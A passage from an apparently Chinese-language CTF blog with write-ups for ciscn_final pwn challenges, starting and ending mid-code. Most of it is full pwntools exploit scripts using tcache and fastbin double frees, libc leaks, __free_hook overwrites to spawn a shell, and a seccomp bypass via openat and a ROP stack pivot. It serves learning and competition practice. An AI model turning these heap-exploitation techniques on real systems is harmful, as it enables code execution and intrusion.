= (_IO_list_all_offset + <span class="number">0x22000</span> - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'\x30\x00'</span> <span class="comment"># $pc start</span></span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = read(<span class="number">1</span>, <span class="number">7</span>) <span class="comment"># $r1 = code[$pc + 7] = code[0x3008]</span></span><br><span class="line">    payload += read(<span class="number">2</span>, <span class="number">7</span>) <span class="comment"># $r2 = code[$pc + 7] = code[0x3009]</span></span><br><span class="line">    payload += read_code(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># $r0 = code[($r1 &lt;&lt; 8) + $r2]</span></span><br><span class="line">    payload += print_reg0() <span class="comment"># print $r0</span></span><br><span class="line">    payload += addi(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># $r2 = $r2 + 1</span></span><br><span class="line">    payload += read_code(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># $r0 = code[($r1 &lt;&lt; 8) + $r2]</span></span><br><span class="line">    payload += print_reg0() <span class="comment"># print $r0</span></span><br><span class="line">    payload += halt() <span class="comment"># halt</span></span><br><span class="line">    payload += big_endian(offset &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    payload += big_endian(offset &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_free_hook</span><span class="params">()</span>:</span></span><br><span class="line">    offset = (__free_hook_offset + <span class="number">0x22000</span> - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'\x30\x00'</span> <span class="comment"># $pc start</span></span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = read(<span class="number">1</span>, <span class="number">7</span>) <span class="comment"># $r1 = code[$pc + 7] = code[0x3008]</span></span><br><span class="line">    payload += read(<span class="number">2</span>, <span class="number">7</span>) <span class="comment"># $r2 = code[$pc + 7] = code[0x3009]</span></span><br><span class="line">    payload += read(<span class="number">3</span>, <span class="number">7</span>) <span class="comment"># $r3 = code[$pc + 7] = code[0x300A]</span></span><br><span class="line">    payload += write_code(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># code[($r1 &lt;&lt; 8) + $r2] = $r3</span></span><br><span class="line">    payload += addi(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># $r2 = $r2 + 1</span></span><br><span class="line">    payload += read(<span class="number">3</span>, <span class="number">5</span>) <span class="comment"># $r3 = code[$pc + 7] = code[0x300B]</span></span><br><span class="line">    payload += write_code(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># code[($r1 &lt;&lt; 8) + $r2] = $r3</span></span><br><span class="line">    payload += halt() <span class="comment"># halt</span></span><br><span class="line">    payload += big_endian(offset &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    payload += big_endian(offset &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    payload += big_endian(libc_system &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    payload += big_endian(libc_system &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF026</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'\x00\x00'</span> </span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = big_endian(u16(<span class="string">"/b"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"in"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"/s"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"h\x00"</span>))</span><br><span class="line">    payload = payload.ljust(<span class="number">0x6000</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload += quit()</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">_IO_list_all_offset = libc.sym[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">stderr_offset = libc.sym[<span class="string">"_IO_2_1_stderr_"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">libc_stderr = leak_stderr()</span><br><span class="line">libc_base = libc_stderr - stderr_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">write_free_hook()</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">getshell()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="ciscn-final-2"><a href="#ciscn-final-2" class="headerlink" title="ciscn_final_2"></a>ciscn_final_2</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>本地调试的时候因为创建的<code>flag</code>文件是空的，啥也没打印出来，结果以为没成功，愣是浪费时间，有点蠢。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol><li><code>execve</code>被禁了，但是<code>flag</code>打开了而且文件描述符改为666。</li><li>很明显的tcache double free，开始以为后面要rop，因为exit里面接受了99个字符的输入，感觉可以写rop chain然后跳过来；后来发现每次写要么只能写2 bytes，要么4 bytes，而地址至少6 bytes，显然行不通。</li><li>改变思路，把<code>stdin-&gt;_fileno</code>改为666，让它在<code>scanf</code>的时候自己读flag自己打印出来就行了。</li><li>由于直接读写都只能是2或者4 bytes，所以还要考虑一下堆布局，分配<code>stdin</code>的chunk空间还是要通过partial write unsorted bin-&gt;bk，至于unsorted bin需要伪造size得到，细节就不赘述了。</li><li>改完<code>stdin-&gt;_fileno</code>退出就能打印出flag了。（有个不明白的地方，开始还担心改完了<code>stdin-&gt;_fileno</code>之后，标准输入流就失效了，那怎么选择退出功能？结果<code>read</code>还是照样可以输入，但是<code>scanf</code>却是直接从<code>flag</code>里面读的，什么原因？）</li><li>还有一个点是，由于double free利用一般是<code>free</code>两次然后<code>malloc</code>三次，所以这里如果一开始tcache bin是空的也就是<code>count==0</code>，那么利用完了之后<code>count==0xFFFF</code>从而被误认为已经满了，所以后续如果<code>free</code>这个size的chunk，是不会放到tcache bin里面的，所以要先<code>free</code>几个块填个位置，防止<code>count==0xFFFF</code>。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(type, inode)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line">    p.sendlineafter(<span class="string">"your inode number:"</span>, str(inode))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line">    p.recvuntil(<span class="string">"your int type inode number :"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">stdin_offset = libc.sym[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_addr_low = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> heap_addr_low &lt; <span class="number">0</span>:</span><br><span class="line">    heap_addr_low += <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enough space</span></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x501</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">1</span>, heap_addr_low + <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_low = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> main_arena_low &lt; <span class="number">0</span>:</span><br><span class="line">    main_arena_low += <span class="number">0x100000000</span></span><br><span class="line">libc_base_low = main_arena_low - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_stdin_low = libc_base_low + stdin_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># avoid fastbin</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">2</span>, heap_addr_low + <span class="number">0x150</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># partial write</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, (libc_stdin_low + <span class="number">112</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">666</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr_low: "</span> + hex(heap_addr_low))</span><br><span class="line">success(<span class="string">"libc_base_low: "</span> + hex(libc_base_low))</span><br><span class="line">success(<span class="string">"libc_stdin_low: "</span> + hex(libc_stdin_low))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>题目逻辑简单，但是我还是要花一定时间做堆的布局，还是没有特别熟练，还得练。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><ol><li>明显的<code>free</code>之后指针没有清空，造成可以double free。</li><li>因为没有传统的那种<code>show</code>功能，因为要爆破写<code>stdout</code>，后面发现每次<code>new</code>一个chunk都会输出chunk的地址，那就好办了。</li><li>这里因为size限制最大为0x78，没办法直接得到unsorted bin，所以还要通过chunk overlap来改size，创造出unsorted bin来。</li><li>后面主要就是让tcache bin和unsorted bin重叠，然后就能通过tcache bin分配到<code>main_arena+0x60</code>的chunk，从而通过打印的chunk地址，leak libc。</li><li>最后继续利用double free改<code>__free_hook</code>为<code>system</code>来getshell。</li></ol><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the index"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input the size"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"now you can write something"</span>, content)</span><br><span class="line">    p.recvuntil(<span class="string">"gift :0x"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the index"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite size</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x18</span>, <span class="string">'\x80'</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x18</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># enough space</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x48</span>, <span class="string">"CCCC"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    new(i + <span class="number">6</span>, <span class="number">0x78</span>, <span class="string">'CCCC'</span>)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># avoid fastbin</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">new(<span class="number">15</span>, <span class="number">0x28</span>, <span class="string">"CCCC"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">17</span>, <span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="comment"># don't break the unsorted bin</span></span><br><span class="line">new(<span class="number">18</span>, <span class="number">0x78</span>, <span class="string">'\xa0'</span>) </span><br><span class="line">new(<span class="number">19</span>, <span class="number">0x78</span>, <span class="string">"\x00"</span>)</span><br><span class="line">main_arena = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">new(<span class="number">20</span>, <span class="number">0x78</span>, p64(__free_hook))</span><br><span class="line">new(<span class="number">21</span>, <span class="number">0x78</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">22</span>, <span class="number">0x78</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-4"><a href="#ciscn-final-4" class="headerlink" title="ciscn_final_4"></a>ciscn_final_4</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>关键就在于这个<code>open</code>被禁用，可以用<code>openat</code>代替。</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ol><li><code>seccomp-tools dump ciscn_final_4</code>，禁用了<code>execve</code>，显然要orw了。</li><li>binary中的<code>watch</code>函数同时也检测了几个系统调用，也就是不能用： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">watch</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+34h] [rbp-ECh]</span></span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">    <span class="keyword">char</span> v3; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">    __int64 v4; <span class="comment">// [rsp+B8h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        waitpid(a1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !(stat_loc &amp; <span class="number">0x7F</span>) || (<span class="keyword">char</span>)((stat_loc &amp; <span class="number">0x7F</span>) + <span class="number">1</span>) &gt;&gt; <span class="number">1</span> &gt; <span class="number">0</span> || (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> != <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v3);</span><br><span class="line">        v2 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">2</span> || v2 == <span class="number">9</span> || v2 == <span class="number">57</span> || v2 == <span class="number">58</span> || v2 == <span class="number">101</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"hey! what are you doing?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 禁用了<code>open</code>(2)，<code>mmap</code>(9)，<code>fork</code>(57)，<code>vfork</code>(58)，<code>ptrace</code>(101)系统调用。</li><li>patch掉<code>ptrace(TRACEME, xxx, xxx)</code>，方便调试<code>fork</code>出来的子进程。</li><li>明显的fastbin double free，利用unsorted bin来leak出libc地址，之后利用fastbin attack分配到<code>__malloc_hook</code></li><li>在<code>__malloc_hook</code>布置如下的gadget，目的是将栈下压0x38字节，此时<code>rsp</code>正好只想binary开始我们输入<code>name</code>的位置，因此是可控的，可以提前布置rop chain。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401186 loc_401186:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000401186                 add     rsp, 8</span><br><span class="line">.text:000000000040118A                 pop     rbx</span><br><span class="line">.text:000000000040118B                 pop     rbp</span><br><span class="line">.text:000000000040118C                 pop     r12</span><br><span class="line">.text:000000000040118E                 pop     r13</span><br><span class="line">.text:0000000000401190                 pop     r14</span><br><span class="line">.text:0000000000401192                 pop     r15</span><br><span class="line">.text:0000000000401194                 retn</span><br></pre></td></tr></table></figure></li><li>在binary最开始输入<code>name</code>时布置gadget，完成向bss中写入第二段rop chain，同时将栈迁移到该bss上。</li><li>由于<code>open</code>的禁用，故不可用来打开<code>flag</code>文件。因此这里可以使用<code>openat</code>函数，因为<code>open</code>的内部实际上也是通过<code>openat</code>函数实现打开文件的功能的，因此单独调用<code>openat</code>可以绕过<code>open</code>的限制，也能打开文件。</li><li>接下来就是orw拿flag了。</li></ol><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size?"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content?"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span 